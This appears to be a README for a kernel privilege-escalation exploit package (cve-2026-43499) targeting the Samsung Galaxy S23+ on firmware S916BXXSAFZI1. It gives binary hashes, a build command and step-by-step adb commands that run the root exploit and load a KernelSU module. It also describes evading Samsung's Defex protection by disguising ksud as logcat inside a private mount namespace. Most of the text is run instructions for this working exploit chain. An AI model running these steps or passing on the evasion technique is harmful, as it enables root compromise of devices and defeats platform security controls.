# Galaxy S23+ SM-S916B (S916BXXSAFZI1) payload

Exact firmware profile for the Galaxy S23+ on firmware `S916BXXSAFZI1`
(`samsung/dm2qxxx/dm2q:16/BP4A.251205.006/S916BXXSAFZI1`), kernel
`5.15.189-android13-8-33413713-abS916BXXSAFZI1`.

## Status

Offline port derived from the exact CAU FZI1 Image; **not yet
hardware-validated**. Every constant was re-derived from the recovered
FZI1 ELF/BTF (see
[`../../docs/SM-S916B-S916BXXSAFZI1.md`](../../docs/SM-S916B-S916BXXSAFZI1.md)
for the full drift record and verification method). The exploit chain is
the hardware-proven FZH3 MCAST route, unchanged in structure.

KernelSU late-load reuses the FZG1 loader pair
`kernelsu/ksud-dm2q-S916BXXSAFZG1-kdp`: all 200 undefined module symbols
resolve against the recovered FZI1 `vmlinux.elf`, and the module-relevant
ABI layouts (`enum ucount_type`, `task_struct`, `cred`, `ucounts`,
workqueue structs) are byte-identical between the FZH3 and FZI1 BTF type
universes. The same binary is already device-tested on FZH3 (see the
FZH3 record).

## Files

| File | SHA-256 |
| --- | --- |
| `cve-2026-43499-app.so` | `79d46813bb25e91b8cfa08786cc194294b998f8ae170ccf2b9d67aec35430fea` |
| `cve-2026-43499-root` | `375857c5d9a3b425c84decbb243f4abba579993c33ea30086c29fd3a7e8f06f2` |
| `../../kernelsu/ksud-dm2q-S916BXXSAFZG1-kdp` | `5da5818d36da2d589496f91016078a43f50489e5c98b319db4eaa5ee475b86bd` (cross-build reuse, audited against FZI1, see above) |

## Build

Built with NDK r30 (30.0.16248370), API 35:

```sh
make TARGET=dm2q-S916BXXSAFZI1 ANDROID_NDK_HOME=/opt/android-ndk
```

## Per-boot usage

Everything is volatile; a reboot removes root and the KernelSU module.

```cmd
adb push cve-2026-43499-app.so /data/local/tmp/dm2q.so
adb push cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb push ../../kernelsu/ksud-dm2q-S916BXXSAFZG1-kdp /data/local/tmp/ksud-s25u-kdp
adb shell "chmod 755 /data/local/tmp/cve-2026-43499-root /data/local/tmp/ksud-s25u-kdp"
```

Wait about one minute after a fresh boot, then run one attempt per boot:

```cmd
adb shell "SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=115 EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 /data/local/tmp/cve-2026-43499-root --run-payload /data/local/tmp/dm2q.so /data/local/tmp/cve-2026-43499-root /data/local/tmp/dm2q-fzi1.log"
```

Verify shell root, stage `ksud`, and run the guarded late-load while the
device is still Permissive (the current `su_daemon.c` passes `--ephemeral`,
which this ksud build does not accept, so the guarded invocation is
replicated manually):

```cmd
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id; getenforce'"
adb shell "/data/local/tmp/cve-2026-43499-root -c 'cp /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage; chmod 755 /data/local/tmp/.ksud-stage'"
adb shell "/data/local/tmp/cve-2026-43499-root -c 'unshare -m sh -c \"mount --bind /data/local/tmp/ksud-s25u-kdp /system/bin/logcat && exec logcat late-load --package-name me.weishu.kernelsu\" > /data/local/tmp/ksud-late.log 2>&1'"
adb shell "grep kernelsu /proc/modules"
adb shell "su -c id"
```

Direct execution of `ksud` from `/data/local/tmp` is Defex-killed
(`Killed`, rc=137); only the logcat-disguised invocation inside a private
mount namespace loads the module. Expect retries: failed attempts leave PI
state behind and the runner refuses in-boot retries by design.

If the tracefs slide or P0 oracle stage fails cleanly on hardware, capture
the log before rebooting: a P0 fingerprint mismatch would indicate the
rebuilt FZI1 `abl.elf` loads the Image at a physical base other than the
carried-over `0x80080000` (see the porting record's P0 section).
